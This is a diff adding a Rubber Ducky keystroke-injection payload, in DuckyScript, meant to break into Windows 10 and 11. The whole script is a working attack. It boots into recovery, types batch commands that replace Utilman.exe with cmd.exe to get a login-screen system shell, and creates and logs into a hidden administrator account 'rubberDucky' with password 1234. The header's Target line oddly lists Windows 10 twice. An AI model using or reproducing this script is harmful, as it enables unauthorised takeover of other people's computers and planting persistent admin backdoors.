@@ -1,0 +1,115 @@
+REM Title: Example Payload
+REM Author: Tzur Soffer
+REM Description: Break into Windows 10 + 11
+REM Target: Windows 10, Windows 10
+REM Props: Hak5, Darren Kitchen, Korben
+REM Version: 1.1
+REM Category: General
+
+REM get into safe mode
+STRING QQQQQQQQQ
+DELAY 3000
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 100
+UP
+DELAY 200
+
+HOLD SHIFT
+DELAY 200
+HOLD SPACE
+DELAY 100
+RELEASE SPACE
+DELAY 100
+ENTER
+RELEASE SHIFT
+
+DELAY 60000
+REM ADD CMD to login page
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+REM replace utilman.exe with cmd.exe
+
+REM Check each drive from C: to G: for Utilman.exe
+STRING @echo off
+ENTER
+STRING setlocal enabledelayedexpansion
+ENTER
+STRING for %d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+ENTER
+STRING     if exist %d:\Windows\System32\Utilman.exe (
+ENTER
+STRING         echo Utilman.exe found in drive %d:
+ENTER
+STRING         cd /d %d:\Windows\System32\
+ENTER
+STRING     )
+ENTER
+STRING )
+ENTER
+STRING copy Utilman.exe  Utilman2.exe
+ENTER
+STRING copy  cmd.exe  Utilman.exe /y
+ENTER
+
+STRING exit
+ENTER
+DELAY 1000
+ENTER
+DELAY 60000
+
+REM go into shell from login page
+STRING QQQQQQQQQ
+DELAY 3000
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+
+REM create new admin acount
+STRING net user rubberDucky 1234 /add
+ENTER
+STRING net localgroup administrators rubberDucky /add
+ENTER
+STRING shutdown /r /t 0
+ENTER
+DELAY 45000
+
+REM login to new user
+STRING QQQQQQQQQ
+DELAY 3000
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 500
+STRING 1234
+ENTER
